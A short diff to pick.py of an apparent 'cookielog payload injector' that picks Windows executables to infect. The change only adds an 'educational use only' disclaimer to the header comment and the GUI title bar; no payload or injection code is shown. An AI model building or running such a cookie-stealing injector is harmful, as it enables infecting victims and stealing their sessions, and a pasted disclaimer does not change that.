@@ -1,4 +1,12 @@
 # pick.py -- chooses which .exe to infect. Classifies the PE before you click.
+#
+#   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING
+#
+#   This is offensive security tooling for penetration testing, red-team
+#   exercises, and security education. Only use on systems you own or are
+#   explicitly authorized to test. Unauthorized use is illegal. The authors
+#   are not responsible for misuse.
+#
 #   pick.bat / pythonw pick.py   -> GUI
 #   python pick.py --cli         -> no desktop (psexec, ssh)
 #   python pick.py --dark         -> force dark mode
@@ -405,6 +413,8 @@ def gui():
     hdr.pack(fill="x", padx=12, pady=(10, 2))
     ttk.Label(hdr, text="cookielog", style="Title.TLabel").pack(side="left")
     ttk.Label(hdr, text="  payload injector", style="Dim.TLabel").pack(side="left", pady=(4,0))
+    ttk.Label(hdr, text="  [ EDUCATIONAL USE ONLY -- security research / training ]",
+              style="Dim.TLabel", foreground="#cc6600").pack(side="left", pady=(4,0))
 
     def toggle_theme():
         nt = "light" if UI["theme"] == "dark" else "dark"
